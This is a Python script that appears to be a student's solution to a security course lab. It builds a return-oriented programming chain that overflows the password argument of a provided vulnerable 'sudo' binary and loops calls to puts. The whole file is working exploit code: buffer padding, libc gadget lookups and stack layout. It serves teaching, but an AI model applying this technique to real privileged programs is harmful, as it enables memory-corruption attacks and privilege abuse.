import os
import sys
import base64
import struct
import addresses
from infosec.core import assemble
from search import GadgetSearch


PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'


def get_string(student_id):
    return 'Take me (%s) to your leader!' % student_id


def get_arg() -> bytes:
    """
    This function returns the (pre-encoded) `password` argument to be sent to
    the `sudo` program.

    This data should cause the program to execute our ROP-chain for printing our
    message in an endless loop. Make sure to return a `bytes` object and not an
    `str` object.

    NOTES:
    1. Use `addresses.PUTS` to get the address of the `puts` function.
    2. Don't write addresses of gadgets directly - use the search object to
       find the address of the gadget dynamically.

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the password argument.
    """
    search = GadgetSearch(LIBC_DUMP_PATH)
    
    #step 1 : Load the address of puts into ebp
    POP_ebp = struct.pack('<I', search.find('POP ebp'))
    puts_address = struct.pack('<I', addresses.PUTS)
    LOAD_EBP = POP_ebp + puts_address
    
    #step 2 (and 5) : jump to puts
    POP_esp = struct.pack('<I', search.find('POP esp')) 
    #$eip = 0xbfffdfcc 
    code_begin = addresses.CODE_BEGIN
    loop_begin_addr = code_begin + len(LOAD_EBP)
    JUMP_back = POP_esp + struct.pack('<I', loop_begin_addr)
    
    
    #step 3 : skip 4 bytes on the stack - just pop something
    SKIP_4 = struct.pack('<I', search.find('POP edx'))


    #step 4 : my string as bytes, address is code_begin + all the gadgets and adresses that I put on the stack
    my_string = get_string(322712860).encode('latin-1')
    my_string_loc = code_begin + len(LOAD_EBP) + len(puts_address) + len(SKIP_4) + 4 + len(JUMP_back)
    my_string_addr = struct.pack('<I', my_string_loc) 


    offset = 135 #as discovered in q1a
    
    shellcode = (b'a' * offset) + LOAD_EBP + puts_address + SKIP_4 + my_string_addr + JUMP_back + my_string
    
    return shellcode


def main(argv):
    # WARNING: DON'T EDIT THIS FUNCTION!
    # NOTE: os.execl() accepts `bytes` as well as `str`, so we will use `bytes`.
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, base64.b64encode(get_arg()))


if __name__ == '__main__':
    main(sys.argv)
